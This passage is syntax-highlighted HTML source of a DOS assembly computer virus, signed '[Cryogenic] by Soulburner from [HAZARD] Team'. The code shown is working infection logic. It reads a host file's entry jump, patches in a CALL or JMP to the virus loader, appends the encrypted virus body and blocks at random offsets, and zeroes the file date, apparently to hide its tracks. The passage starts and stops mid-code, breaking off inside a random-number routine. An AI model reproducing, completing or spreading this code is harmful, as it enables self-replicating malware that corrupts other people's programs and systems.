    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Dx = offset in file</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">XMM</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">     </span><span class="sc1">; Write crypted</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Jump to beginning of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">     </span><span class="sc1">; Read 50 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">JmpP</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Dx=0. Used in relative call offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">     </span><span class="sc1">; If first byte is JMP NEAR ?</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItJump</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotJmp</span><span class="sc0">          </span><span class="sc1">; Not jump</span><span class="sc0">
</span><span class="sc5">ItJump</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Calculate offset in file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">   </span><span class="sc1">; Check if it points to any block ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ItLower</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">   </span><span class="sc1">; First - points to loader ?</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Compare1</span><span class="sc0">
</span><span class="sc5">ItLower</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
</span><span class="sc5">Compare1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Second - check if it points to </span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">OkWithLoader</span><span class="sc0">         </span><span class="sc1">; any block</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Blah</span><span class="sc0">
</span><span class="sc5">OkWithLoader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Blocks</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tbl</span><span class="sc0">
</span><span class="sc5">FindOff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ItLower2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Compare2</span><span class="sc0">
</span><span class="sc5">ItLower2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
</span><span class="sc5">Compare2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NormalBlock</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Blah</span><span class="sc0">
</span><span class="sc5">NormalBlock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FindOff</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; All ok - no blocks there.</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Point to this area</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">JmpP</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">     </span><span class="sc1">; Read 50 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NotJmp</span><span class="sc0">          </span><span class="sc1">; Lets trace it</span><span class="sc0">
</span><span class="sc5">Blah</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Founded jump to our blocks/loader</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">JPatch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Simple modify it.</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">      </span><span class="sc1">; Read first bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">JPatch</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; Write our jmp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">WriteStuff</span><span class="sc0">
</span><span class="sc5">NotJmp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">     </span><span class="sc1">; Si - where we loaded data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Surf</span><span class="sc0">           </span><span class="sc1">; Surf through it !</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">      </span><span class="sc1">; Store founded bytes </span><span class="sc0">
                    </span><span class="sc1">; (Surf finished at it)</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">JmpP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">JPatch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Encode call</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; Patch different values</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">][</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">JmpP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">            </span><span class="sc1">; Back to loaded routine</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write changed bytes (with call)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrpAr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">WriteStuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">; To the end of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Write file stuff</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Vlen</span><span class="sc4">+</span><span class="sc5">ldrl</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">            </span><span class="sc1">; Set date = 0</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">          </span><span class="sc1">; Close file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;   jmp NFile</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">JPatch</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">GetOff</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">        </span><span class="sc1">; This sub proc gets random</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">NegPvlen</span><span class="sc0">             </span><span class="sc1">; offset for block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">
</span><span class="sc5">NegPvlen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">FLen</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getrnd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">zTbl</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc0">        </span><span class="sc1">; Check new offset with</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; Loader</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Okz</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">Ldrl</span><span class="sc4">+</span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc4">+</span><span class="sc5">Dlen</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">GetOff</span><span class="sc0">
</span><span class="sc5">Okz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tbl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Blocks</span><span class="sc0">
</span><span class="sc5">CheckOut</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">Si</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Cnt</span><span class="sc4">],</span><span class="sc5">Blocks</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItSpec</span><span class="sc0">
</span><span class="sc1">;------------------------------------</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc4">+</span><span class="sc2">53</span><span class="sc0">             </span><span class="sc1">; Check new offset with offsets</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoSub</span><span class="sc0">                </span><span class="sc1">; of previous blocks</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">PVlen</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OkSub</span><span class="sc0">
</span><span class="sc5">NoSub</span><span class="sc4">:</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
</span><span class="sc5">OkSub</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ItOk</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">PVlen</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">GetOff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">iTOk</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc5">ItSpec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc4">+</span><span class="sc5">Lvlen</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">NoSub2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Pvlen</span><span class="sc4">+</span><span class="sc5">LVlen</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OkSub2</span><span class="sc0">
</span><span class="sc5">NoSub2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">53</span><span class="sc0">
</span><span class="sc5">OkSub2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ItOk</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">Pvlen</span><span class="sc4">+</span><span class="sc5">Lvlen</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">GetOff</span><span class="sc0">
</span><span class="sc1">;-----------------------------------</span><span class="sc0">
</span><span class="sc5">ItOk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckOut</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetOff</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'[Cryogenic] by Soulburner from [HAZARD] Team'</span><span class="sc0">

</span><span class="sc5">RandSeed</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">12345678h</span><span class="sc0">

</span><span class="sc5">getrnd</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; Get's random value</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">; Save used registers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; save limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Lets make some manipulations</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; with old random value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Exchange it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
